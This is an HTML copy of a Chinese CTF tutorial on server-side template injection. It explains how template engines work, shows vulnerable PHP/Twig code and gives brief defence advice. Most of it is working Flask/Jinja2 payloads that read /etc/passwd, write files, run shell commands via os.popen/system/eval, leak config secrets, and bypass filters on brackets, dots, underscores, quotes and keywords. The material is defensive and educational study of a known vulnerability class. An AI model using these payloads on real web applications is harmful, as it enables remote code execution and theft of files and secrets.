<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/93746437">原文</a></p>
<div class="title-image"><img src="https://pic1.zhimg.com/v2-d1286023a6e059327ac8e1eca76280bd_b.jpg" alt=""></div><h2>SSTI（模板注入）</h2><p>首先，我们先搞清楚什么是模版引擎（SST）。</p><blockquote>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。   </blockquote><p>一个空白的 html 页面只有变量，访问这个页面时需要将这些变量转换成预期的内容，这时候就需要用到模板引擎。php（或者其他脚本语言）代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的 html 页面，从而实现 php 和 html 代码的分离。</p><p><b>简而言之，就是一个购物清单，将上面的一个一个商品名换成对应的商品放在购物车里。</b></p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg" data-caption="" data-size="small" data-rawwidth="1000" data-rawheight="952" class="origin_image zh-lightbox-thumb" width="1000" data-original="https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg" data-caption="" data-size="small" data-rawwidth="1000" data-rawheight="952" class="origin_image zh-lightbox-thumb lazy" width="1000" data-original="https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg"/></figure><p><b>模板引擎的作用</b></p><p>如果在一个页面中 php 代码与 html 代码混合在一起，在很多时候都会造成不便，用模板引擎可以让 php 代码和 html 代码进行分离。</p><p><b>为什么模板引擎是危险的？</b></p><p>SST 表面上看起来并没有什么危害，但是如果你仔细研究的话，会发现它能在模板中执行本机函数，这就意味着如果攻击者能够向模板文件中写入这种表达式，他们就能够执行任意函数。</p><p>那 require() 和 eval() 函数来说，require() 函数会包含一个文件并执行，eval() 函数不是执行文件，而是将字符串当成代码来执行。</p><p>将未经处理的输入传递给 eval() 函数是极其危险的，你们的编程老师应该都跟你们反复提到过。但是当涉及到处理模板引擎时，很多人就忽略了这一点。所以，有时候你看到的代码会是下面这样的：</p><div class="highlight"><pre><code class="language-php">$templateEngine = new TemplateEngine();
$template = $templateEngine-&gt;loadString(&#39;<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method </span><span class="o">=</span> <span class="s">{{method}}</span> <span class="na">action </span><span class="o">=</span> <span class="s">&#34;&#39;. $_SERVER[&#39;PHP_SELF&#39;] . &#39;&#34;</span><span class="p">&gt;</span>[...]<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>&#39;);
$template-&gt;assign(&#39;method&#39;,&#39;POST&#39;);
$template-&gt;show();</code></pre></div><p>这段代码显示，在模板中，有一处输入是用户可控的，这就意味着用户可以执行模板表达式。</p><p>举个例子，恶意的表达式可能非常简单，比如 [[system(‘whoami’)]]，这样会执行系统命令 whoami。因此模板注入很容易导致远程代码执行（RCE），就像未经过处理的输入直接传递为 eval() 函数一样。</p><blockquote>SST 信任了用户的输入，并且执行这些内容，包括执行本机函数。就像 eval 函数对传入的内容未加任何过滤一样。因此模板注入很容易导致远程代码执行（RCE）、信息泄露等漏洞。</blockquote><p>这就是我们所说的服务器端模板注入（SSTI），上面这个例子可能比较傻，但在实际中，漏洞会非常隐蔽、难以发现。比如将许多不同的组件连接在一起传递为模板引擎，但是忽视了其中的某些组件可能包含用户可控的输入等等。</p><p><b>注入原理</b></p><p>使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于 GET 请求参数 $_GET[&#34;name&#34;]。</p><div class="highlight"><pre><code class="language-php"><span class="cp">&lt;?php</span>
    <span class="k">require_once</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/../lib/Twig/Autoloader.php&#39;</span><span class="p">;</span>
    <span class="nx">Twig_Autoloader</span><span class="o">::</span><span class="na">register</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
    <span class="nv">$tw</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Twig_Environment</span><span class="p">(</span><span class="k">new</span> <span class="nx">Twig_Loader_String</span><span class="p">());</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$tw</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s2">&#34;Hello {{username}}&#34;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]));</span>  <span class="c1">// 将用户输入作为模版变量的值
</span><span class="c1"></span>    <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div><p>显然这段代码并没有什么问题，即使你想通过 username 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成 XSS。</p><p><b>但是，如果渲染的模版内容受到用户的控制，结果就会完全不同。</b></p><p>修改代码为：</p><div class="highlight"><pre><code class="language-php"><span class="cp">&lt;?php</span>
    <span class="k">require_once</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/../lib/Twig/Autoloader.php&#39;</span><span class="p">;</span>
    <span class="nx">Twig_Autoloader</span><span class="o">::</span><span class="na">register</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
    <span class="nv">$tw</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Twig_Environment</span><span class="p">(</span><span class="k">new</span> <span class="nx">Twig_Loader_String</span><span class="p">());</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$tw</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s2">&#34;Hello </span><span class="si">{</span>$_GET[&#39;username&#39;]<span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>  <span class="c1">// 将用户输入作为模版内容的一部分
</span><span class="c1"></span>    <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，浏览器弹窗，XSS 构建成功。</p><p>在 Twig 模板引擎里，{{var}}  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 username={{2*2}}，则在服务端拼接的模版显示结果就为：<b>Hello 4</b></p><p><b>如何防御SSTI？</b></p><p>为了防止此类漏洞的存在，应该尽可能加载静态模板文件。</p><ul><li>我们已经确定此功能类似于 require() 函数调用。因此，你也应该防止本地文件包含（LFI）漏洞，不要允许用户控制此类文件或其内容的路径。</li><li>如果需要将动态数据传递给模板，不要直接在模板文件中执行，可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。</li></ul><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg" data-caption="" data-size="small" data-rawwidth="640" data-rawheight="386" class="origin_image zh-lightbox-thumb" width="640" data-original="https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg" data-caption="" data-size="small" data-rawwidth="640" data-rawheight="386" class="origin_image zh-lightbox-thumb lazy" width="640" data-original="https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_b.jpg"/></figure><h2>Flask SSTI漏洞🕳</h2><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取flag 或 getshell 的目的。下面以 Python 为例：</p><p>Flask SSTI 题的基本思路就是利用 python 中的 <b>魔术方法</b> 找到自己要用的函数。</p><ul><li>__dict__：保存类实例或对象实例的属性变量键值对字典</li><li>__class__：返回调用的参数类型</li><li>__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li>__bases__：返回类型列表</li><li>__subclasses__：返回object的子类</li><li>__init__：类的初始化方法</li><li>__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><blockquote>__base__ 和 __mro__ 都是用来寻找基类的。</blockquote><p><b>基本流程</b></p><p>使用魔术方法进行函数解析，再获取基本类：</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">//</span><span class="err">针对</span><span class="n">jinjia2</span><span class="o">/</span><span class="n">flask为</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="err">适用</span></code></pre></div><p>获取基本类后，继续向下获取基本类 object 的子类：</p><div class="highlight"><pre><code class="language-python"><span class="nb">object</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span></code></pre></div><p>找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><div class="highlight"><pre><code class="language-python"><span class="o">&gt;&gt;&gt;</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">99</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span>
<span class="o">&lt;</span><span class="n">slot</span> <span class="n">wrapper</span> <span class="s1">&#39;__init__&#39;</span> <span class="n">of</span> <span class="s1">&#39;object&#39;</span> <span class="n">objects</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span>
<span class="o">&lt;</span><span class="n">unbound</span> <span class="n">method</span> <span class="n">WarningMessage</span><span class="o">.</span><span class="fm">__init__</span><span class="o">&gt;</span></code></pre></div><p>查看其引用 __builtins__</p><p>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span></code></pre></div><p>这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 file 以实现读取文件的功能：</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;F://GetFlag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></code></pre></div><p><b>读写文件</b></p><p>读文件：</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></code></pre></div><p>写文件：</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">()</span></code></pre></div><p>存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。</p><p>还有另外的方法：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></code></pre></div><p>写文件换为 .write() 即可。</p><p><b>命令执行</b></p><p><b>No.1</b></p><p>利用eval 进行命令执行。</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;</span><span class="p">)</span></code></pre></div><p>或者。。。</p><p><b>No.2</b></p><p>利用warnings.catch_warnings 进行命令执行。</p><p>首先，查看 warnings.catch_warnings 方法的位置：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="p">)</span></code></pre></div><p>查看 linecatch 的位置：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;linecache&#39;</span><span class="p">)</span></code></pre></div><p>查找 os 模块的位置：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span></code></pre></div><p>查找 system 方法的位置：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span></code></pre></div><p>调用 system 方法：</p><div class="highlight"><pre><code class="language-python"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">144</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span></code></pre></div><p><b>No.3</b></p><p>利用 commands 进行命令执行。</p><div class="highlight"><pre><code class="language-python"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;commands&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getstatusoutput</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span></code></pre></div><p class="ztext-empty-paragraph"><br/></p><div class="highlight"><pre><code class="language-python"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span></code></pre></div><p class="ztext-empty-paragraph"><br/></p><div class="highlight"><pre><code class="language-python"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></code></pre></div><h2>姿势集🪓</h2><p>1️⃣</p><p>{{config}} 可以获取当前设置，如果题目是这样的：</p><blockquote>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</blockquote><p>可以直接访问 {{config[&#39;FLAG&#39;]}} 或者 {{config.FLAG}} 得到 flag。</p><p>2️⃣</p><p>同样可以找到 config。</p><div class="highlight"><pre><code class="language-python"><span class="p">{{</span><span class="bp">self</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">config</span><span class="p">}}</span></code></pre></div><p>3️⃣</p><p>[]、()</p><div class="highlight"><pre><code class="language-python"><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">68</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;FLAG]}}</span></code></pre></div><p>4️⃣</p><p>url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等</p><p>如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：</p><div class="highlight"><pre><code class="language-python"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span>
<span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span>
<span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__self__</span><span class="o">.</span><span class="n">_get_data_for_json</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;json&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">JSONEncoder</span><span class="o">.</span><span class="n">default</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]}}</span></code></pre></div><p>5️⃣</p><p>过滤了 []、.</p><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p><div class="highlight"><pre><code class="language-python"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></code></pre></div><p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p><p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p><p>即将 request.__class__ 改成 request|attr(&#34;__class__&#34;) </p><p>6️⃣</p><p>过滤下划线 _</p><p>利用 request.args 的属性</p><div class="highlight"><pre><code class="language-python"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span></code></pre></div><p>将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。</p><p>GET:</p><div class="highlight"><pre><code class="language-python"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span></code></pre></div><p>POST:</p><div class="highlight"><pre><code class="language-python"><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span></code></pre></div><p>7️⃣</p><p>过滤引号 &#34;</p><p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p><div class="highlight"><pre><code class="language-python"><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span></code></pre></div><p>8️⃣</p><p>一些关键字被过滤。</p><p><b>base64编码绕过</b><br/>用于__getattribute__使用实例访问属性时。</p><p>例如，过滤掉 __class__ 关键词</p><div class="highlight"><pre><code class="language-python"><span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;X19jbGFzc19f&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span></code></pre></div><p><b>字符串拼接绕过</b></p><div class="highlight"><pre><code class="language-python"><span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__c&#39;</span><span class="o">+</span><span class="s1">&#39;lass__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
